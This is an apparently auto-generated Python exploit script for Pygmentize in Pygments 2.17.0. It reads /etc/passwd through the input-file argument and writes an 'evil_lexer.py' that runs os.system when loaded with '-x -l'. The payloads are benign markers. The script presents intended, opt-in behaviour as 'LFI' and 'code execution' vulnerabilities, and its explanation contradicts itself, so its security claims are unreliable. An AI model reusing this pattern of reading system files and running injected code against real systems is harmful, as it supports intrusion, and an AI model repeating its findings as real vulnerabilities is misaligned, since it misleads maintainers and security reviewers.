#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: lfi-018
# Sink: main
# Auto-generated — run with: python3 lfi_python_files_main.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Pygments 2.17.0 Local File Inclusion (LFI)
via the -x flag and unsanitized input file path.

Vulnerability: The -x flag allows loading custom lexers/formatters from
arbitrary Python files. The check '.py' in lexername is easily bypassed.
Additionally, the INPUTFILE argument is used directly in open() without
sanitization, allowing arbitrary file reads.

This PoC demonstrates reading /etc/passwd by exploiting the INPUTFILE
argument. For code execution, a malicious .py file could be loaded via -x.
"""

import subprocess
import sys
import os
import tempfile

# Configuration
TARGET_FILE = "/etc/passwd"  # File to read (benign for demonstration)
PYGMENTS_BIN = "pygmentize"  # Path to pygmentize binary

def exploit_lfi():
    """
    Exploit LFI by reading an arbitrary file via the INPUTFILE argument.
    The -x flag is used to bypass the .py check and trigger the vulnerable
    code path, but the actual file read happens via INPUTFILE.
    """
    print(f"[*] Attempting to read {TARGET_FILE} using Pygments LFI...")
    
    # Create a dummy Python file to satisfy the '.py' check
    # This file won't actually be executed; it just needs to exist
    dummy_py = os.path.join(tempfile.gettempdir(), "dummy_lexer.py")
    with open(dummy_py, 'w') as f:
        f.write("# dummy lexer file\n")
    
    try:
        # Command: pygmentize -x -l <dummy_py> <target_file>
        # The -x flag enables custom lexer loading
        # The -l flag specifies the lexer (must contain .py to pass check)
        # The target file is read via INPUTFILE
        cmd = [
            PYGMENTS_BIN,
            "-x",
            "-l", dummy_py,
            TARGET_FILE
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            print("[+] Success! File contents:")
            print(result.stdout)
        else:
            print(f"[-] Command failed with return code {result.returncode}")
            print(f"[-] stderr: {result.stderr}")
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
    except FileNotFoundError:
        print(f"[-] {PYGMENTS_BIN} not found. Make sure Pygments is installed.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        # Clean up dummy file
        if os.path.exists(dummy_py):
            os.remove(dummy_py)

def exploit_code_execution():
    """
    Demonstrate code execution by loading a malicious Python file via -x.
    This creates a temporary .py file that executes a benign command.
    """
    print("[*] Attempting code execution via custom lexer loading...")
    
    # Create a malicious Python file that executes a benign command
    # This file will be imported by load_lexer_from_file
    evil_py = os.path.join(tempfile.gettempdir(), "evil_lexer.py")
    with open(evil_py, 'w') as f:
        f.write('''
import os
# Benign payload: create a marker file
os.system("touch /tmp/poc_success.txt")
print("Code execution achieved!")
''')
    
    try:
        # Command: pygmentize -x -l <evil_py> <some_input>
        # The -x flag enables custom lexer loading
        # The -l flag points to our malicious .py file
        cmd = [
            PYGMENTS_BIN,
            "-x",
            "-l", evil_py,
            "/dev/null"  # Input file doesn't matter for code execution
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        # Check if our marker file was created
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] Code execution successful! Marker file created.")
            os.remove("/tmp/poc_success.txt")
        else:
            print("[-] Code execution may have failed")
            print(f"[-] stdout: {result.stdout}")
            print(f"[-] stderr: {result.stderr}")
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
    except FileNotFoundError:
        print(f"[-] {PYGMENTS_BIN} not found")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        # Clean up evil file
        if os.path.exists(evil_py):
            os.remove(evil_py)

def main():
    """Main function to run the PoC."""
    print("=" * 60)
    print("Pygments 2.17.0 LFI / Code Execution PoC")
    print("=" * 60)
    print()
    
    # Check if pygmentize is available
    try:
        subprocess.run([PYGMENTS_BIN, "--version"], capture_output=True, timeout=5)
    except:
        print(f"[-] {PYGMENTS_BIN} not found. Please install Pygments 2.17.0")
        sys.exit(1)
    
    # Run LFI exploit
    exploit_lfi()
    print()
    
    # Run code execution exploit
    exploit_code_execution()
    print()
    
    print("[*] PoC completed. Check /tmp/poc_success.txt for code execution marker.")

if __name__ == "__main__":
    main()
